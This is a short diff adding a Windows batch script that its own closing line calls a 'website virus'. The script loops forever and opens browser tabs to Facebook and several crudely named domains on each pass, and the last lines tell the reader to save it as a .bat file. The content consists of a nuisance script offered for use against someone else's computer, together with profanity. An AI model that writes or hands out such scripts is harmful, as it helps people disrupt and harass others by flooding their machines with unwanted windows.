@@ -1,0 +1,17 @@
+@echo off
+:fucked
+start www.facebook.com
+start www.fuck.com
+start www.suck.com
+start www.laure.com
+start www.ass.com
+start www.dick.com
+start www.facebook.com
+start www.fuck.com
+start www.suck.com
+start www.laure.com
+start www.ass.com
+start www.dick.com
+goto :fucked
+# now save this and Your website virus is created.
+remember to save the file as bat ;)
